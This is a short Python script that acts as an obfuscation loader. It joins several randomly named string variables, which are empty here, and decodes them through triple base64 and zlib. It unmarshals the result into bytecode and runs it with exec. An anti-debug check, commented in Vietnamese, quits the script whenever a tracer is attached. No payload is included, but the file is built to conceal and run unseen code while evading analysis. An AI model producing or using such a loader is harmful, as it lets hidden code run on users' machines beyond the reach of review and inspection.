lstIDjQa = ''
khhZSWiE = ''
ELfPsbeL = ''
zhivJFMg = ''
DGboSfFF = ''
QoSeGRhj = ''
MvypylQK = ''

import base64, zlib, marshal, sys

# anti-debug đơn giản
if hasattr(sys, 'gettrace') and sys.gettrace():
    exit()

data = lstIDjQa + khhZSWiE + ELfPsbeL + zhivJFMg + DGboSfFF + QoSeGRhj + MvypylQK

for _ in range(3):
    data = base64.b64decode(data)

data = zlib.decompress(data)
code = marshal.loads(data)

exec(code)
